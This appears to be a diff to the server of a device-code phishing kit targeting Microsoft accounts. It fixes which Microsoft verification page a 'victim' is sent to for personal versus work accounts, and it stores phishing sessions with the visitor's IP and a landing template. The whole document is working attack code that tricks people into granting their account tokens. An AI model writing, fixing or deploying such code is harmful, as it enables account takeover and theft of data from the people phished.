@@ -21309,25 +21309,42 @@ def serve_landing(slug):
     except Exception as e:
         logger.warning(f"[LANDING] pending-session lookup failed: {e}")
 
+    def _device_auth_url(code, acct):
+        """Where the victim must enter the code.
+
+        Consumer (v1) codes are only accepted on the live.com remote-connect
+        page that the v1 endpoint hands out — the common deviceauth page
+        rejects them with "That code didn't work". Work codes go to the
+        common deviceauth page.
+        """
+        if acct == 'personal':
+            return 'https://www.microsoft.com/link'
+        return ('https://login.microsoftonline.com/common/oauth2/deviceauth'
+                f'?user_code={code}')
+
     if reused:
         user_code = reused['user_code']
-        verification_uri = reused.get('verification_uri') or verification_uri
+        verification_uri = _device_auth_url(user_code, acct_type)
         session_ok = True
     else:
         try:
             if acct_type == 'personal':
                 # v1 flow — proven working for consumer accounts (same as roadtx)
                 uc, dc, vu, _ = oauth.request_device_code_v1()
+                # Consumer codes are only accepted on the live.com remote-connect
+                # page that the v1 endpoint hands out; the common deviceauth page
+                # rejects them ("That code didn't work").
+                complete_url = vu or 'https://www.microsoft.com/link'
             else:
                 uc, dc, vu, _ = oauth.request_device_code()
+                complete_url = f"https://login.microsoftonline.com/common/oauth2/deviceauth?user_code={uc}"
             if uc and dc:
                 user_code = uc
-                verification_uri = vu or verification_uri
-                complete_url = f"https://login.microsoftonline.com/common/oauth2/deviceauth?user_code={uc}"
+                verification_uri = complete_url
                 session_ok = db.create_session(
                     uc,
                     dc,
-                    verification_uri,
+                    complete_url,
                     landing_template_id,
                     complete_url,
                     client_ip=visitor_ip,
